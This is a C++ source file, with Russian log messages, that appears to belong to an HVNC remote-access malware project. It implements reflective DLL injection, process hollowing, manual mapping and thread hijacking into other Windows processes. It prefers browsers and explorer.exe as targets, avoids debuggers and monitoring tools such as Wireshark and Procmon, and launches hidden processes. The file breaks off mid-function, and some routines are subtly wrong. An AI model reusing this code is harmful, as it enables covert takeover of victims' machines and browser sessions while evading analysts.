#include "code_injection.h"
#include "../logger/file_logger.h"
#include "../common.h"
#include <tlhelp32.h>
#include <psapi.h>
#include <winternl.h>
#include <ntstatus.h>
#include <vector>
#include <memory>
#include <algorithm>

#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* pNtReadVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);

namespace CodeInjection {

static bool g_debugPrivilegeEnabled = false;
static std::vector<TargetProcess> g_processCache;
static DWORD g_lastCacheUpdate = 0;

CodeInjector::CodeInjector() {
    if (!g_debugPrivilegeEnabled) {
        ProcessUtils::EnableDebugPrivilege();
        g_debugPrivilegeEnabled = true;
    }
    LogDebug("CodeInjector", "Инициализация системы инъекции кода");
}

CodeInjector::~CodeInjector() {
    LogDebug("CodeInjector", "Деинициализация системы инъекции кода");
}

InjectionResult CodeInjector::InjectIntoProcess(DWORD processId, 
                                              const std::vector<BYTE>& payload, 
                                              InjectionType type) {
    InjectionResult result;
    result.success = false;
    result.processId = processId;
    result.type = type;
    result.errorCode = 0;

    LogInjectionAttempt(processId, type);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        result.errorCode = GetLastError();
        result.errorMessage = "Не удалось открыть целевой процесс";
        LogError("CodeInjector", "Ошибка открытия процесса %d: %d", processId, result.errorCode);
        return result;
    }

    switch (type) {
        case InjectionType::REFLECTIVE_DLL:
            result = ReflectiveDLLInjection(hProcess, payload);
            break;
        case InjectionType::PROCESS_HOLLOWING:
            result = ProcessHollowing(hProcess, payload);
            break;
        case InjectionType::MANUAL_MAP:
            result = ManualMapInjection(hProcess, payload);
            break;
        case InjectionType::THREAD_HIJACKING:
            result = ThreadHijacking(hProcess, payload);
            break;
        default:
            result.errorMessage = "Неподдерживаемый тип инъекции";
            LogError("CodeInjector", "Неподдерживаемый тип инъекции: %d", (int)type);
    }

    CloseHandle(hProcess);
    
    if (result.success) {
        LogInfo("CodeInjector", "Успешная инъекция в процесс %d типом %s", 
                processId, InjectionTypeToString(type).c_str());
    } else {
        LogError("CodeInjector", "Ошибка инъекции в процесс %d: %s", 
                 processId, result.errorMessage.c_str());
    }

    return result;
}

InjectionResult CodeInjector::ReflectiveDLLInjection(HANDLE hProcess, 
                                                   const std::vector<BYTE>& dllData) {
    InjectionResult result;
    result.success = false;
    result.type = InjectionType::REFLECTIVE_DLL;

    DWORD reflectiveLoaderOffset = FindReflectiveLoader(dllData);
    if (reflectiveLoaderOffset == 0) {
        result.errorMessage = "Не найден рефлективный загрузчик в DLL";
        return result;
    }

    SIZE_T dllSize = dllData.size();
    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, dllSize, 
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        result.errorCode = GetLastError();
        result.errorMessage = "Ошибка выделения памяти в целевом процессе";
        return result;
    }

    SIZE_T written;
    if (!WriteProcessMemory(hProcess, remoteMemory, dllData.data(), dllSize, &written)) {
        result.errorCode = GetLastError();
        result.errorMessage = "Ошибка записи DLL в память процесса";
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        return result;
    }

    LPVOID entryPoint = (LPVOID)((DWORD_PTR)remoteMemory + reflectiveLoaderOffset);
    
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                       (LPTHREAD_START_ROUTINE)entryPoint, 
                                       remoteMemory, 0, NULL);
    if (!hThread) {
        result.errorCode = GetLastError();
        result.errorMessage = "Ошибка создания удаленного потока";
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        return result;
    }

    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);

    result.success = true;
    result.injectedAddress = remoteMemory;
    return result;
}

InjectionResult CodeInjector::ProcessHollowing(HANDLE hProcess, 
                                              const std::vector<BYTE>& payload) {
    InjectionResult result;
    result.success = false;
    result.type = InjectionType::PROCESS_HOLLOWING;

    if (!ParsePE(payload)) {
        result.errorMessage = "Некорректный PE файл";
        return result;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload.data();
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload.data() + dosHeader->e_lfanew);

    if (!UnmapTargetImage(hProcess)) {
        result.errorMessage = "Ошибка размаппинга целевого образа";
        return result;
    }

    LPVOID imageBase = VirtualAllocEx(hProcess, 
                                     (LPVOID)ntHeaders->OptionalHeader.ImageBase,
                                     ntHeaders->OptionalHeader.SizeOfImage,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!imageBase) {
        imageBase = VirtualAllocEx(hProcess, NULL, 
                                  ntHeaders->OptionalHeader.SizeOfImage,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

    if (!imageBase) {
        result.errorCode = GetLastError();
        result.errorMessage = "Ошибка выделения памяти для образа";
        return result;
    }

    if (!MapPayloadToTarget(hProcess, imageBase, payload)) {
        result.errorMessage = "Ошибка маппинга полезной нагрузки";
        VirtualFreeEx(hProcess, imageBase, 0, MEM_RELEASE);
        return result;
    }

    if (!PatchEntryPoint(hProcess, imageBase, ntHeaders)) {
        result.errorMessage = "Ошибка патчинга точки входа";
        VirtualFreeEx(hProcess, imageBase, 0, MEM_RELEASE);
        return result;
    }

    result.success = true;
    result.injectedAddress = imageBase;
    return result;
}

InjectionResult CodeInjector::ManualMapInjection(HANDLE hProcess, 
                                                const std::vector<BYTE>& payload) {
    InjectionResult result;
    result.success = false;
    result.type = InjectionType::MANUAL_MAP;

    if (!ParsePE(payload)) {
        result.errorMessage = "Некорректный PE файл";
        return result;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload.data();
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload.data() + dosHeader->e_lfanew);

    LPVOID imageBase = AllocateImageMemory(hProcess, ntHeaders->OptionalHeader.SizeOfImage);
    if (!imageBase) {
        result.errorCode = GetLastError();
        result.errorMessage = "Ошибка выделения памяти для образа";
        return result;
    }

    if (!CopySections(hProcess, imageBase, payload)) {
        result.errorMessage = "Ошибка копирования секций";
        VirtualFreeEx(hProcess, imageBase, 0, MEM_RELEASE);
        return result;
    }

    if (!FixImports(hProcess, imageBase, payload)) {
        result.errorMessage = "Ошибка исправления импортов";
        VirtualFreeEx(hProcess, imageBase, 0, MEM_RELEASE);
        return result;
    }

    if (!ApplyRelocations(hProcess, imageBase, payload)) {
        result.errorMessage = "Ошибка применения релокаций";
        VirtualFreeEx(hProcess, imageBase, 0, MEM_RELEASE);
        return result;
    }

    if (!ExecuteInTarget(hProcess, imageBase, ntHeaders)) {
        result.errorMessage = "Ошибка выполнения в целевом процессе";
        VirtualFreeEx(hProcess, imageBase, 0, MEM_RELEASE);
        return result;
    }

    result.success = true;
    result.injectedAddress = imageBase;
    return result;
}

InjectionResult CodeInjector::ThreadHijacking(HANDLE hProcess, 
                                             const std::vector<BYTE>& payload) {
    InjectionResult result;
    result.success = false;
    result.type = InjectionType::THREAD_HIJACKING;

    DWORD processId = GetProcessId(hProcess);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        result.errorCode = GetLastError();
        result.errorMessage = "Ошибка создания снимка потоков";
        return result;
    }

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    
    DWORD targetThreadId = 0;
    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == processId) {
                targetThreadId = te32.th32ThreadID;
                break;
            }
        } while (Thread32Next(hSnapshot, &te32));
    }
    
    CloseHandle(hSnapshot);

    if (targetThreadId == 0) {
        result.errorMessage = "Не найден подходящий поток для перехвата";
        return result;
    }

    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetThreadId);
    if (!hThread) {
        result.errorCode = GetLastError();
        result.errorMessage = "Ошибка открытия целевого потока";
        return result;
    }

    if (SuspendThread(hThread) == -1) {
        result.errorCode = GetLastError();
        result.errorMessage = "Ошибка приостановки потока";
        CloseHandle(hThread);
        return result;
    }

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx)) {
        result.errorCode = GetLastError();
        result.errorMessage = "Ошибка получения контекста потока";
        ResumeThread(hThread);
        CloseHandle(hThread);
        return result;
    }

    SIZE_T payloadSize = payload.size();
    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, payloadSize, 
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        result.errorCode = GetLastError();
        result.errorMessage = "Ошибка выделения памяти";
        ResumeThread(hThread);
        CloseHandle(hThread);
        return result;
    }

    SIZE_T written;
    if (!WriteProcessMemory(hProcess, remoteMemory, payload.data(), payloadSize, &written)) {
        result.errorCode = GetLastError();
        result.errorMessage = "Ошибка записи полезной нагрузки";
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        return result;
    }

#ifdef _WIN64
    ctx.Rip = (DWORD64)remoteMemory;
#else
    ctx.Eip = (DWORD)remoteMemory;
#endif

    if (!SetThreadContext(hThread, &ctx)) {
        result.errorCode = GetLastError();
        result.errorMessage = "Ошибка установки контекста потока";
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        return result;
    }

    ResumeThread(hThread);
    CloseHandle(hThread);

    result.success = true;
    result.injectedAddress = remoteMemory;
    return result;
}

DWORD CodeInjector::FindBestTargetProcess() {
    ProcessUtils::UpdateProcessCache();
    
    std::vector<TargetProcess> suitableProcesses;
    for (const auto& proc : g_processCache) {
        if (ProcessUtils::IsProcessSuitable(proc.processId)) {
            suitableProcesses.push_back(proc);
        }
    }

    if (suitableProcesses.empty()) {
        LogWarning("CodeInjector", "Не найдено подходящих процессов для инъекции");
        return 0;
    }

    std::sort(suitableProcesses.begin(), suitableProcesses.end(),
              [](const TargetProcess& a, const TargetProcess& b) {
                  return a.priority > b.priority;
              });

    LogInfo("CodeInjector", "Выбран процесс для инъекции: %s (PID: %d)", 
            suitableProcesses[0].name.c_str(), suitableProcesses[0].processId);
    
    return suitableProcesses[0].processId;
}

namespace ProcessUtils {

bool EnableDebugPrivilege() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return false;
    }

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid)) {
        CloseHandle(hToken);
        return false;
    }

    bool result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    
    LogInfo("ProcessUtils", "Debug privilege %s", result ? "включен" : "не включен");
    return result;
}

std::vector<TargetProcess> FindProcessesByName(const std::string& processName) {
    std::vector<TargetProcess> processes;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        LogError("ProcessUtils", "Ошибка создания снимка процессов: %d", GetLastError());
        return processes;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            std::string currentName(pe32.szExeFile);
            if (currentName.find(processName) != std::string::npos) {
                TargetProcess proc;
                proc.processId = pe32.th32ProcessID;
                proc.name = currentName;
                proc.parentId = pe32.th32ParentProcessID;
                proc.priority = CalculateProcessPriority(pe32.th32ProcessID);
                processes.push_back(proc);
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return processes;
}

bool IsProcessSuitable(DWORD processId) {
    if (IsSystemProcess(processId) || IsProcessDebugged(processId) || 
        IsProcessSuspicious(processId) || IsProcessMonitored(processId)) {
        return false;
    }

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
    if (!hProcess) {
        return false;
    }

    bool suitable = !IsProcessElevated(processId) && 
                   IsProcessInSameSession(processId) &&
                   !Is64BitProcess(hProcess);

    CloseHandle(hProcess);
    return suitable;
}

void UpdateProcessCache() {
    DWORD currentTime = GetTickCount();
    if (currentTime - g_lastCacheUpdate < 30000) {
        return;
    }

    g_processCache.clear();
    std::vector<DWORD> processIds = EnumerateProcesses();
    
    for (DWORD pid : processIds) {
        TargetProcess proc;
        proc.processId = pid;
        proc.name = GetProcessImagePath(pid);
        proc.priority = CalculateProcessPriority(pid);
        
        if (!proc.name.empty()) {
            g_processCache.push_back(proc);
        }
    }

    g_lastCacheUpdate = currentTime;
    LogInfo("ProcessUtils", "Обновлен кеш процессов: %zu записей", g_processCache.size());
}

std::vector<DWORD> EnumerateProcesses() {
    std::vector<DWORD> processIds;
    DWORD processes[1024], needed, processCount;

    if (EnumProcesses(processes, sizeof(processes), &needed)) {
        processCount = needed / sizeof(DWORD);
        for (DWORD i = 0; i < processCount; i++) {
            if (processes[i] != 0) {
                processIds.push_back(processes[i]);
            }
        }
    }

    return processIds;
}

std::string GetProcessImagePath(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (!hProcess) {
        return "";
    }

    char imagePath[MAX_PATH];
    DWORD pathLength = sizeof(imagePath);
    
    if (QueryFullProcessImageNameA(hProcess, 0, imagePath, &pathLength)) {
        CloseHandle(hProcess);
        return std::string(imagePath);
    }

    CloseHandle(hProcess);
    return "";
}

bool IsProcessElevated(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
    if (!hProcess) {
        return true;
    }

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        CloseHandle(hProcess);
        return true;
    }

    TOKEN_ELEVATION elevation;
    DWORD size;
    bool isElevated = true;

    if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
        isElevated = elevation.TokenIsElevated != 0;
    }

    CloseHandle(hToken);
    CloseHandle(hProcess);
    return isElevated;
}

bool IsSystemProcess(DWORD processId) {
    if (processId == 0 || processId == 4) {
        return true;
    }

    std::string imagePath = GetProcessImagePath(processId);
    if (imagePath.empty()) {
        return true;
    }

    std::vector<std::string> systemPaths = {
        "\\system32\\", "\\syswow64\\", "\\windows\\",
        "csrss.exe", "winlogon.exe", "services.exe", "lsass.exe"
    };

    for (const auto& path : systemPaths) {
        if (imagePath.find(path) != std::string::npos) {
            return true;
        }
    }

    return false;
}

DWORD GetProcessSessionId(DWORD processId) {
    DWORD sessionId = 0;
    ProcessIdToSessionId(processId, &sessionId);
    return sessionId;
}

bool IsProcessInSameSession(DWORD processId) {
    DWORD currentSessionId = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &currentSessionId);
    
    DWORD targetSessionId = GetProcessSessionId(processId);
    return currentSessionId == targetSessionId;
}

bool Is64BitProcess(HANDLE hProcess) {
    BOOL isWow64 = FALSE;
    if (IsWow64Process(hProcess, &isWow64)) {
        return !isWow64;
    }
    return false;
}

bool IsProcessSuspicious(DWORD processId) {
    std::string imagePath = GetProcessImagePath(processId);
    if (imagePath.empty()) {
        return true;
    }

    std::vector<std::string> suspiciousNames = {
        "procmon", "wireshark", "fiddler", "ollydbg", "x64dbg",
        "ida", "ghidra", "immunity", "windbg", "cheatengine"
    };

    std::transform(imagePath.begin(), imagePath.end(), imagePath.begin(), ::tolower);

    for (const auto& name : suspiciousNames) {
        if (imagePath.find(name) != std::string::npos) {
            return true;
        }
    }

    return false;
}

bool IsProcessDebugged(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
    if (!hProcess) {
        return true;
    }

    BOOL isDebugged = FALSE;
    CheckRemoteDebuggerPresent(hProcess, &isDebugged);
    
    CloseHandle(hProcess);
    return isDebugged != FALSE;
}

bool IsProcessMonitored(DWORD processId) {
    std::string imagePath = GetProcessImagePath(processId);
    if (imagePath.empty()) {
        return true;
    }

    std::vector<std::string> monitoringTools = {
        "processhacker", "systemexplorer", "sysinternals",
        "autoruns", "regshot", "api monitor"
    };

    std::transform(imagePath.begin(), imagePath.end(), imagePath.begin(), ::tolower);

    for (const auto& tool : monitoringTools) {
        if (imagePath.find(tool) != std::string::npos) {
            return true;
        }
    }

    return false;
}

int CalculateProcessPriority(DWORD processId) {
    int priority = 0;
    std::string imagePath = GetProcessImagePath(processId);
    
    if (imagePath.find("chrome.exe") != std::string::npos ||
        imagePath.find("firefox.exe") != std::string::npos ||
        imagePath.find("msedge.exe") != std::string::npos) {
        priority += 50;
    }
    
    if (imagePath.find("explorer.exe") != std::string::npos) {
        priority += 30;
    }
    
    if (imagePath.find("notepad.exe") != std::string::npos ||
        imagePath.find("calc.exe") != std::string::npos) {
        priority += 20;
    }
    
    if (!IsProcessElevated(processId)) {
        priority += 10;
    }

    return priority;
}

}

DWORD CodeInjector::FindReflectiveLoader(const std::vector<BYTE>& dllData) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllData.data();
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return 0;
    }

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dllData.data() + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return 0;
    }

    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)(dllData.data() + 
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* nameTable = (DWORD*)(dllData.data() + exportDir->AddressOfNames);
    WORD* ordinalTable = (WORD*)(dllData.data() + exportDir->AddressOfNameOrdinals);
    DWORD* addressTable = (DWORD*)(dllData.data() + exportDir->AddressOfFunctions);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* functionName = (char*)(dllData.data() + nameTable[i]);
        if (strcmp(functionName, "ReflectiveLoader") == 0) {
            return addressTable[ordinalTable[i]];
        }
    }

    return 0;
}

bool CodeInjector::ParsePE(const std::vector<BYTE>& peData) {
    if (peData.size() < sizeof(IMAGE_DOS_HEADER)) {
        return false;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peData.data();
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return false;
    }

    if (peData.size() < dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS)) {
        return false;
    }

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(peData.data() + dosHeader->e_lfanew);
    return ntHeaders->Signature == IMAGE_NT_SIGNATURE;
}

bool CodeInjector::UnmapTargetImage(HANDLE hProcess) {
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    if (!hNtdll) {
        return false;
    }

    pNtUnmapViewOfSection NtUnmapViewOfSection = 
        (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    
    if (!NtUnmapViewOfSection) {
        return false;
    }

    PROCESS_BASIC_INFORMATION pbi;
    NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, 
                                               &pbi, sizeof(pbi), NULL);
    if (status != STATUS_SUCCESS) {
        return false;
    }

    PEB peb;
    SIZE_T read;
    if (!ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &read)) {
        return false;
    }

    LPVOID imageBase = peb.ImageBaseAddress;
    status = NtUnmapViewOfSection(hProcess, imageBase);
    
    return status == STATUS_SUCCESS || status == STATUS_INVALID_ADDRESS;
}

bool CodeInjector::MapPayloadToTarget(HANDLE hProcess, LPVOID imageBase, 
                                     const std::vector<BYTE>& payload) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload.data();
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload.data() + dosHeader->e_lfanew);

    SIZE_T written;
    if (!WriteProcessMemory(hProcess, imageBase, payload.data(), 
                           ntHeaders->OptionalHeader.SizeOfHeaders, &written)) {
        return false;
    }

    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (sectionHeader[i].SizeOfRawData > 0) {
            LPVOID sectionDest = (LPVOID)((DWORD_PTR)imageBase + sectionHeader[i].VirtualAddress);
            const BYTE* sectionSrc = payload.data() + sectionHeader[i].PointerToRawData;
            
            if (!WriteProcessMemory(hProcess, sectionDest, sectionSrc, 
                                   sectionHeader[i].SizeOfRawData, &written)) {
                return false;
            }
        }
    }

    return true;
}

bool CodeInjector::PatchEntryPoint(HANDLE hProcess, LPVOID imageBase, 
                                  PIMAGE_NT_HEADERS ntHeaders) {
    PROCESS_BASIC_INFORMATION pbi;
    NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, 
                                               &pbi, sizeof(pbi), NULL);
    if (status != STATUS_SUCCESS) {
        return false;
    }

    PEB peb;
    SIZE_T read;
    if (!ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &read)) {
        return false;
    }

    LPVOID newEntryPoint = (LPVOID)((DWORD_PTR)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    
    SIZE_T written;
    if (!WriteProcessMemory(hProcess, &peb.ImageBaseAddress, &imageBase, sizeof(imageBase), &written)) {
        return false;
    }

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_INTEGER;
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId());
    if (hThread) {
        GetThreadContext(hThread, &ctx);
#ifdef _WIN64
        ctx.Rcx = (DWORD64)newEntryPoint;
#else
        ctx.Eax = (DWORD)newEntryPoint;
#endif
        SetThreadContext(hThread, &ctx);
        CloseHandle(hThread);
    }

    return true;
}

LPVOID CodeInjector::AllocateImageMemory(HANDLE hProcess, SIZE_T size) {
    return VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
}

bool CodeInjector::CopySections(HANDLE hProcess, LPVOID imageBase, 
                               const std::vector<BYTE>& payload) {
    return MapPayloadToTarget(hProcess, imageBase, payload);
}

bool CodeInjector::FixImports(HANDLE hProcess, LPVOID imageBase, 
                             const std::vector<BYTE>& payload) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload.data();
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload.data() + dosHeader->e_lfanew);

    DWORD importRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (importRVA == 0) {
        return true;
    }

    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(payload.data() + importRVA);
    
    while (importDesc->Name) {
        char* moduleName = (char*)(payload.data() + importDesc->Name);
        HMODULE hModule = LoadLibraryA(moduleName);
        
        if (hModule) {
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(payload.data() + importDesc->FirstThunk);
            PIMAGE_THUNK_DATA origThunk = (PIMAGE_THUNK_DATA)(payload.data() + importDesc->OriginalFirstThunk);
            
            while (thunk->u1.AddressOfData) {
                PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(payload.data() + origThunk->u1.AddressOfData);
                FARPROC procAddress = GetProcAddress(hModule, importByName->Name);
                
                if (procAddress) {
                    LPVOID thunkAddr = (LPVOID)((DWORD_PTR)imageBase + 
                                               ((DWORD_PTR)thunk - (DWORD_PTR)payload.data()));
                    SIZE_T written;
                    WriteProcessMemory(hProcess, thunkAddr, &procAddress, sizeof(procAddress), &written);
                }
                
                thunk++;
                origThunk++;
            }
        }
        
        importDesc++;
    }

    return true;
}

bool CodeInjector::ApplyRelocations(HANDLE hProcess, LPVOID imageBase, 
                                   const std::vector<BYTE>& payload) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload.data();
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload.data() + dosHeader->e_lfanew);

    DWORD_PTR delta = (DWORD_PTR)imageBase - ntHeaders->OptionalHeader.ImageBase;
    if (delta == 0) {
        return true;
    }

    DWORD relocRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    if (relocRVA == 0) {
        return true;
    }

    PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(payload.data() + relocRVA);
    
    while (reloc->VirtualAddress) {
        WORD* relocData = (WORD*)((DWORD_PTR)reloc + sizeof(IMAGE_BASE_RELOCATION));
        int numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        
        for (int i = 0; i < numEntries; i++) {
            WORD relocType = relocData[i] >> 12;
            WORD relocOffset = relocData[i] & 0xFFF;
            
            if (relocType == IMAGE_REL_BASED_HIGHLOW || relocType == IMAGE_REL_BASED_DIR64) {
                LPVOID relocAddr = (LPVOID)((DWORD_PTR)imageBase + reloc->VirtualAddress + relocOffset);
                DWORD_PTR value;
                SIZE_T read;
                
                if (ReadProcessMemory(hProcess, relocAddr, &value, sizeof(value), &read)) {
                    value += delta;
                    SIZE_T written;
                    WriteProcessMemory(hProcess, relocAddr, &value, sizeof(value), &written);
                }
            }
        }
        
        reloc = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)reloc + reloc->SizeOfBlock);
    }

    return true;
}

bool CodeInjector::ExecuteInTarget(HANDLE hProcess, LPVOID imageBase, 
                                  PIMAGE_NT_HEADERS ntHeaders) {
    LPVOID entryPoint = (LPVOID)((DWORD_PTR)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                       (LPTHREAD_START_ROUTINE)entryPoint, 
                                       imageBase, 0, NULL);
    if (!hThread) {
        return false;
    }

    CloseHandle(hThread);
    return true;
}

void CodeInjector::LogInjectionAttempt(DWORD processId, InjectionType type) {
    LogInfo("CodeInjector", "Попытка инъекции в процесс %d типом %s", 
            processId, InjectionTypeToString(type).c_str());
}

std::string CodeInjector::InjectionTypeToString(InjectionType type) {
    switch (type) {
        case InjectionType::REFLECTIVE_DLL: return "Reflective DLL";
        case InjectionType::PROCESS_HOLLOWING: return "Process Hollowing";
        case InjectionType::MANUAL_MAP: return "Manual Map";
        case InjectionType::THREAD_HIJACKING: return "Thread Hijacking";
        case InjectionType::ATOM_BOMBING: return "Atom Bombing";
        case InjectionType::PROCESS_GHOSTING: return "Process Ghosting";
        default: return "Unknown";
    }
}

namespace HVNCInjection {

InjectionResult InjectHVNCIntoBrowser(const std::string& browserName) {
    CodeInjector injector;
    
    std::vector<TargetProcess> browserProcesses = ProcessUtils::FindProcessesByName(browserName);
    if (browserProcesses.empty()) {
        InjectionResult result;
        result.success = false;
        result.errorMessage = "Не найдены процессы браузера " + browserName;
        return result;
    }

    std::sort(browserProcesses.begin(), browserProcesses.end(),
              [](const TargetProcess& a, const TargetProcess& b) {
                  return a.priority > b.priority;
              });

    std::vector<BYTE> hvncPayload;
    
    LogInfo("HVNCInjection", "Попытка инъекции HVNC в браузер %s (PID: %d)", 
            browserName.c_str(), browserProcesses[0].processId);

    return injector.InjectIntoProcess(browserProcesses[0].processId, hvncPayload, 
                                     InjectionType::REFLECTIVE_DLL);
}

InjectionResult InjectHVNCIntoSystemProcess() {
    CodeInjector injector;
    
    std::vector<std::string> targetProcesses = {"explorer.exe", "winlogon.exe", "dwm.exe"};
    
    for (const auto& processName : targetProcesses) {
        std::vector<TargetProcess> processes = ProcessUtils::FindProcessesByName(processName);
        
        for (const auto& proc : processes) {
            if (ProcessUtils::IsProcessSuitable(proc.processId)) {
                std::vector<BYTE> hvncPayload;
                
                LogInfo("HVNCInjection", "Попытка инъекции HVNC в системный процесс %s (PID: %d)", 
                        processName.c_str(), proc.processId);
                
                return injector.InjectIntoProcess(proc.processId, hvncPayload, 
                                                 InjectionType::PROCESS_HOLLOWING);
            }
        }
    }

    InjectionResult result;
    result.success = false;
    result.errorMessage = "Не найдены подходящие системные процессы";
    return result;
}

InjectionResult InjectHVNCIntoExistingProcess(DWORD processId) {
    CodeInjector injector;
    
    if (!ProcessUtils::IsProcessSuitable(processId)) {
        InjectionResult result;
        result.success = false;
        result.errorMessage = "Процесс не подходит для инъекции";
        return result;
    }

    std::vector<BYTE> hvncPayload;
    
    LogInfo("HVNCInjection", "Инъекция HVNC в указанный процесс (PID: %d)", processId);
    
    return injector.InjectIntoProcess(processId, hvncPayload, InjectionType::MANUAL_MAP);
}

InjectionResult CreateHiddenHVNCProcess() {
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    std::string commandLine = "C:\\Windows\\System32\\notepad.exe";
    
